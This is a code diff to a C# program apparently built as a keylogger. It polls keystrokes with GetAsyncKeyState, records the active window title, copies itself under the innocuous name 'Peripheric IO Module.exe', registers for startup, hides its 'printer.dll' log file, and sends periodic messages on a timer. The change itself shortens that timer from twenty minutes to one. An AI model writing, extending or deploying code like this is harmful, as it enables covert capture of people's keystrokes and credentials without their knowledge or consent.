@@ -9,6 +9,7 @@ using System.Threading;
 using System.Timers;
 using Microsoft.Win32;
 
+
 namespace Printer
 {
 
@@ -17,14 +18,15 @@ namespace Printer
     {
 
         private string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\printer.dll";
-        
+        private static string folderPath = Environment.CurrentDirectory;
+        private static string folderName = new DirectoryInfo(folderPath).Name;
 
         [DllImport("user32.dll")]
         static extern IntPtr GetForegroundWindow();
+        
         [DllImport("user32.dll")]
         static extern int GetWindowText(IntPtr hwnd, StringBuilder ss, int count);
-
-
+        
         [DllImport("User32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
@@ -32,15 +34,13 @@ namespace Printer
 
         static void Main(string[] args)
         {
-            string folderPath = Environment.CurrentDirectory;
-            string folderName = new DirectoryInfo(folderPath).Name;
+           
 
             CopyProgram(); //calls function
 
 
             if (folderName != "PIOM")    //Checks if the program is running from the new location 
-                                         //if not runs the program from the new location
-            {
+            {                            //if not runs the program from the new location
                 var TestProcess = new Process();  
 
                 TestProcess.StartInfo.FileName = "Peripheric IO Module.exe";
@@ -48,25 +48,17 @@ namespace Printer
                 TestProcess.Start();
             }
          
-            if (folderName == "PIOM") //Checks if the program is running from new location
-                                      //calls the function
-            {
+            else //if the program is running from the new location the rest of the functions are being called
+            {                          
                 AddApplicationToStartup();
-            }
-            
-            if (folderName == "PIOM")   //Checks if the program is running from new location
-                                         //calls the function
-            {
                 new Program().start();
+              
             }
+           
 
-            
+        }      
 
-
-
-
-        }
-
+        
         private static void CopyProgram() //Clones program to the new location
         {
            
@@ -110,7 +102,7 @@ namespace Printer
         {
             if (System.IO.File.Exists(path)) System.IO.File.SetAttributes(path, FileAttributes.Hidden);
             System.Timers.Timer t = new System.Timers.Timer();
-            t.Interval = 60000 * 20; // 60000(1 minute) * the number of minutes
+            t.Interval = 60000 * 1; // 60000ms(1 minute) * the number of minutes
             t.Elapsed += SendNewMessage;
             t.AutoReset = true;
             t.Enabled = true;
@@ -248,8 +240,7 @@ namespace Printer
                 }
             }
         }
-
-
+      
 
         private void SendNewMessage(Object source, ElapsedEventArgs e)
         {
@@ -267,6 +258,7 @@ namespace Printer
                 if (GetWindowText(handle, ss, nChar) > 0) return ss.ToString();
                 else return "";
             }
+
 
             try
             {
